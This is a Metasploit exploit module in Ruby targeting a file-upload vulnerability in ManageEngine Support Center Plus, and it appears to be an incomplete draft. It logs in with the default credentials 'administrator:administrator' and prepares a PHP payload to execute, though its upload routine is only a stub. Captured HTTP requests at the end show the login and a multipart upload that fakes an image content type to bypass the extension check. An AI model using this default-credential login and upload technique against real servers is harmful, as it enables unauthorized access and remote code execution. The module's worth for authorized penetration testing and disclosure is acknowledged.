##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::PhpEXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ManageEngine Support Center Plus File Upload Vulnerability",
			'Description'    => %q{
					This module exploits a file upload vulnerability found in ManageEngine Support
				Center Plus.  It is possible to bypass the file extension verification check, and
				then upload an arbitrary file on to the service.  A valid login is required in oder
				to exploit the upload feature, however, there are default credentials that can be
				abused.  For example, the default installer comes with 'administrator:administrator'
				for administrative access; or 'guest:guest' for guest access.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'xistence',  # Original
					'sinn3r'     # Metasploit
				],
			'References'     =>
				[
					['OSVDB', '86598'],
					['EDB', '22040']
				],
			'Platform'       => ['linux', 'win'],
			'Targets'        =>
				[
					[ 'Winodws', { 'Arch' => ARCH_X86, 'Platform' => 'win' }  ],
					[ 'Linux'  , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Oct 17 2012"
		))

		register_options(
			[
				OptPort.new('RPORT',       [true, 'The target port', 8080]),
				OptString.new('TARGETURI', [true, 'The base directory to the application', '/']),
				OptString.new('USERNAME',  [true, 'The username to login with', 'administrator']),
				OptString.new('PASSWORD',  [true, 'The password to login with', 'administrator'])
			], self.class)
	end

	def base
		base = target_uri.path
		base << '/' if base[-1,1] != '/'
		return base
	end

	def peer
		"#{rhost}:#{rport}"
	end

	def check
		Exploit::CheckCode::Safe
	end

	def login(user, pass)
		#
		# Get the session ID
		#
		res = send_request_raw({'uri'=>base})
		if res and res.headers['Set-Cookie'] =~ /(JSESSIONID=\w+)\;/
			session_id = $1
			vprint_status("#{peer} - #{session_id}")
		else
			return ''
		end

		#
		# Now login and get the cookie
		#
		send_request_cgi({
			'method'    => 'POST',
			'uri'       => "#{base}j_security_check;#{session_id}",
			'cookie'    => "#{session_id}; PREV_CONTEXT_PATH=",
			'headers'   => {
				'Origin'  => "http://#{peer}",
				'Referer' => "http://#{peer}/"
			},
			'vars_post' => {
				'j_username'      =>user,
				'j_password'      =>pass,
				'logonDomainName' =>'undefined',
				'sso_status'      =>'false',
				'loginButton'     =>'Login'
			}
		})

		#
		# Back to base and see if the login was successful
		#
		res = send_request_raw(
			{
				'uri'    =>"#{base}HomePage.do",
				'cookie' => session_id
			})
		if res and res.body =~ /\<a href\=\"javascript\:preLogout\(\)\"\>Log out\<\/a\>/
			return session_id
		end

		return ''
	end

	def upload_exec(sid, fname, p)
		print_status("Attack")
	end

	def exploit
		#
		# Login in order to obtain the cookie and session ID
		#
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']
		sid = login(user, pass)
		if sid.empty?
			fail_with(Exploit::Failure::Unknown, "#{peer} - Cannot login with '#{user}:#{pass}'")
		end

		#
		# Upload our payload and execute it
		#
		php_fname = "#{Rex::Text.rand_text_alpha(5)}.php"
		p         = get_write_exec_payload(:unlink_self=>true)
		upload_exec(sid, php_fname, p)

		handler
	end
end

=begin
GET / HTTP/1.1
Host: 10.0.1.6:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:16.0) Gecko/20100101 Firefox/16.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

HTTP/1.1 200 OK
Set-Cookie: JSESSIONID=24C6B42849755A397087DF6DF89C0E6C; Path=/


===

POST /j_security_check;jsessionid=B0035C9128100E4254E0211118C5FA84 HTTP/1.1
Host: 10.0.1.6:8080
Connection: keep-alive
Content-Length: 110
Cache-Control: max-age=0
Origin: http://10.0.1.6:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://10.0.1.6:8080/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Cookie: JSESSIONID=B0035C9128100E4254E0211118C5FA84; PREV_CONTEXT_PATH=

j_username=administrator&j_password=administrator&logonDomainName=undefined&sso_status=false&loginButton=Login
HTTP/1.1 302 Moved Temporarily
Location: http://10.0.1.6:8080/
Content-Length: 0
Date: Tue, 30 Oct 2012 04:25:27 GMT
Server: Apache-Coyote/1.1

GET / HTTP/1.1
Host: 10.0.1.6:8080
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://10.0.1.6:8080/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Cookie: JSESSIONID=B0035C9128100E4254E0211118C5FA84; PREV_CONTEXT_PATH=


====

POST /jsp/UploadImage.jsp?Module=WorkOrder HTTP/1.1
Host: exploitme:8080
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Content-Length: 231
Content-Type: multipart/form-data; boundary=---------------------------135769595918512168611930018855
Content-Length: 231

-----------------------------135769595918512168611930018855
Content-Disposition: form-data; name="img_file"; filename="test.txt"
Content-Type: image/gif

TEST!

-----------------------------135769595918512168611930018855--
=end